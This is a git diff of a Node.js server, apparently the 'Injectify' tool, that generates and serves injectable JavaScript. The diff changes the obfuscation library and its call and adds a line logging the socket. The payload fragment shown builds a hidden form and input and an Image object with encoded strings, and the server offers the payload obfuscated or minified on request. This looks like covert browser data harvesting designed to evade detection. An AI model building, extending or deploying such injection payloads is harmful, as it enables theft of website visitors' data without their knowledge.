@@ -24,7 +24,7 @@ const atob			= require('atob')
 const btoa			= require('btoa')
 const beautify		= require('js-beautify').js_beautify
 const UglifyJS		= require("uglify-js")
-const ObfuscateJS	= require('javascript-obfuscator')
+const ObfuscateJS	= require('js-obfuscator')
 
 console.log(chalk.greenBright("[Injectify] ") + "listening on port " + config.express)
 
@@ -117,6 +117,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 					users.findOne({id: user.id}).then(doc => {
 						if(doc !== null) {
 							// User exists in database
+							console.log(socket)
 							users.updateOne({
 								id: user.id
 							},
@@ -767,7 +768,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 					v = ` + enc("input") + `,
 					w = d.createElement(` + enc("form") + `),
 					x = d.createElement(v),
-					r = new Image(),
+					r = new Image,
 					k = window` + variables + `
 				x.name = ""
 				x.style = `+ enc("display:none") + `
@@ -790,12 +791,14 @@ MongoClient.connect(config.mongodb, function(err, db) {
 				})
 			`
 			if (req.query.obfuscate == "true") {
-				res.send(
-					ObfuscateJS.obfuscate(UglifyJS.minify(script).code, {
-						compact: true,
-						controlFlowFlattening: true
-					}).obfuscatedCode
-				)
+				ObfuscateJS(script, {
+					
+				}).then(obfuscated => {
+					res.send(obfuscated)
+				}, function(err) {
+					res.send(UglifyJS.minify(script).code)
+					throw err
+				})
 			} else if (req.query.minify == "true") {
 				res.send(
 					UglifyJS.minify(script).code
